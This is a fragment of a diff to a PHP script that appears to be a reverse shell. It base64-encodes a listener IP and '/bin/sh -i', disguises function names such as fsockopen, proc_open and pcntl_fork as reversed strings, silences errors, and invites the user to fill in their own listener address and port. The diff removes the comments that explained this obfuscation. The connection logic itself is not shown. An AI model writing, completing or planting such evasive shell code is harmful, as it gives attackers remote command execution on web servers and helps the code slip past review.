@@ -3,22 +3,22 @@
 @error_reporting(0);
 @ini_set('display_errors', 0);
 
-// Base64-encoded sensitive values
+
 $ip_b64     = 'MTkyLjE2OC4xLjU=';        // change this to your base64 encoded IP Address
 $port       = 222;                       // change this to your listener port
 $shell_b64  = 'L2Jpbi9zaCAtaQ==';        
 
-// Decode and clean values
+
 $ip    = trim(base64_decode($ip_b64));
 $shell = base64_decode($shell_b64);
 
-// Obfuscated function names
+
 $f1 = strrev('nepokcosf');               
 $f2 = strrev('nepo_corp');              
 $f3 = strrev('gnikcolb_tes_maerts');     
 $f4 = strrev('tceles_maerts');           
 
-// Optional daemonization
+
 $pcntl = function_exists(strrev('krof_ltncp'));  
 $posix = function_exists(strrev('distes_xisop')); 
 
